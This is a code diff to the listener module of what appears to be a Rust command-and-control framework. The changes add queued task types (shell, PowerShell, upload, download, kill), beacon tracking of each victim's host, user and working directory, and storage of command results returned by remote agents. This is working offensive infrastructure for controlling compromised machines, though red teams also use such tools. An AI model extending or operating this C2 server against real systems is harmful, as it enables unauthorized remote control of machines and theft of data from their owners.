@@ -1,4 +1,4 @@
-// src/listener/mod.rs - Fixed with proper agent handling
+// src/listener/mod.rs - Fixed with real command execution
 use std::io;
 use std::sync::{Arc, Mutex};
 use std::thread;
@@ -32,7 +32,7 @@ pub struct ListenerConfig {
     pub port: u16,
 }
 
-// Agent beacon data structure
+// Enhanced agent beacon data structure
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct BeaconData {
     pub id: String,
@@ -42,27 +42,47 @@ pub struct BeaconData {
     pub arch: String,
     pub ip: String,
     pub pid: u32,
+    pub current_directory: Option<String>, // Track current directory
 }
 
-// Task for agents
+// Enhanced task for agents with more metadata
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct AgentTask {
     pub id: String,
     pub command: String,
+    pub task_type: TaskType,
+    pub created_at: u64,
 }
 
-// Task result from agents
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub enum TaskType {
+    Shell,
+    PowerShell,
+    Upload,
+    Download,
+    Kill,
+    Sleep,
+    Cd,
+}
+
+// Enhanced task result with more information
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct TaskResult {
     pub id: String,
+    pub command: String,
     pub result: String,
     pub success: bool,
+    pub execution_time_ms: u64,
+    pub current_directory: Option<String>, // Return updated directory
+    pub error_details: Option<String>,
 }
 
-// Global agent storage
+// Global agent storage with enhanced tracking
 lazy_static! {
     static ref GLOBAL_AGENTS: Arc<Mutex<HashMap<String, Agent>>> = Arc::new(Mutex::new(HashMap::new()));
     static ref PENDING_TASKS: Arc<Mutex<HashMap<String, Vec<AgentTask>>>> = Arc::new(Mutex::new(HashMap::new()));
+    static ref TASK_RESULTS: Arc<Mutex<HashMap<String, Vec<TaskResult>>>> = Arc::new(Mutex::new(HashMap::new()));
+    static ref AGENT_DIRECTORIES: Arc<Mutex<HashMap<String, String>>> = Arc::new(Mutex::new(HashMap::new()));
 }
 
 #[derive(Clone)]
@@ -150,7 +170,7 @@ impl Drop for Listener {
     }
 }
 
-// Public functions to manage agents and tasks
+// Enhanced public functions to manage agents and tasks
 pub fn get_all_agents() -> Vec<Agent> {
     GLOBAL_AGENTS.lock().unwrap().values().cloned().collect()
 }
@@ -159,9 +179,24 @@ pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
     let task_id = format!("task-{}-{}", agent_id, 
         SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs());
     
+    // Determine task type based on command
+    let task_type = if command.trim().starts_with("cd ") {
+        TaskType::Cd
+    } else if command.trim().starts_with("powershell") || command.trim().starts_with("ps ") || command.trim().starts_with("Get-") {
+        TaskType::PowerShell
+    } else if command.trim() == "exit" || command.trim() == "kill" {
+        TaskType::Kill
+    } else if command.trim().starts_with("sleep ") {
+        TaskType::Sleep
+    } else {
+        TaskType::Shell
+    };
+    
     let task = AgentTask {
         id: task_id.clone(),
         command,
+        task_type,
+        created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
     };
     
     let mut pending = PENDING_TASKS.lock().unwrap();
@@ -169,6 +204,20 @@ pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
     
     println!("Added task {} for agent {}", task_id, agent_id);
     task_id
+}
+
+pub fn get_task_results(agent_id: &str) -> Vec<TaskResult> {
+    TASK_RESULTS.lock().unwrap()
+        .get(agent_id)
+        .cloned()
+        .unwrap_or_default()
+}
+
+pub fn get_agent_directory(agent_id: &str) -> String {
+    AGENT_DIRECTORIES.lock().unwrap()
+        .get(agent_id)
+        .cloned()
+        .unwrap_or_else(|| "C:\\".to_string())
 }
 
 async fn start_http_server(
@@ -226,7 +275,7 @@ async fn handle_http_connection(
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     
-    let mut buffer = [0; 4096];
+    let mut buffer = [0; 8192]; // Increased buffer size
     
     match stream.read(&mut buffer).await {
         Ok(0) => return Ok(()), // Connection closed
@@ -265,6 +314,12 @@ async fn handle_beacon_request(
         match serde_json::from_str::<BeaconData>(body) {
             Ok(beacon) => {
                 println!("Agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
+                
+                // Update current directory if provided
+                if let Some(ref current_dir) = beacon.current_directory {
+                    let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
+                    dirs.insert(beacon.id.clone(), current_dir.clone());
+                }
                 
                 // Update or create agent
                 {
@@ -338,8 +393,27 @@ async fn handle_task_result(
                     if result.success { "SUCCESS" } else { "FAILED" });
                 println!("Output: {}", result.result);
                 
-                // Here you could store the result in a database or update GUI
-                // For now, just log it
+                // Update agent directory if this was a cd command
+                if let Some(ref current_dir) = result.current_directory {
+                    // Extract agent ID from task ID (format: task-{agent_id}-{timestamp})
+                    if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
+                        let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
+                        dirs.insert(agent_id, current_dir.clone());
+                    }
+                }
+                
+                // Store the result for GUI access
+                if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
+                    let mut results = TASK_RESULTS.lock().unwrap();
+                    results.entry(agent_id.clone()).or_insert_with(Vec::new).push(result.clone());
+                    
+                    // Keep only last 100 results per agent
+                    if let Some(agent_results) = results.get_mut(&agent_id) {
+                        if agent_results.len() > 100 {
+                            agent_results.drain(0..agent_results.len() - 100);
+                        }
+                    }
+                }
                 
                 let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                 stream.write_all(response.as_bytes()).await?;
@@ -356,6 +430,17 @@ async fn handle_task_result(
     }
     
     Ok(())
+}
+
+fn extract_agent_id_from_task(task_id: &str) -> Option<String> {
+    // Task ID format: task-{agent_id}-{timestamp}
+    let parts: Vec<&str> = task_id.split('-').collect();
+    if parts.len() >= 3 {
+        // Join all parts except first and last (remove "task" prefix and timestamp suffix)
+        Some(parts[1..parts.len()-1].join("-"))
+    } else {
+        None
+    }
 }
 
 fn start_tcp_server(
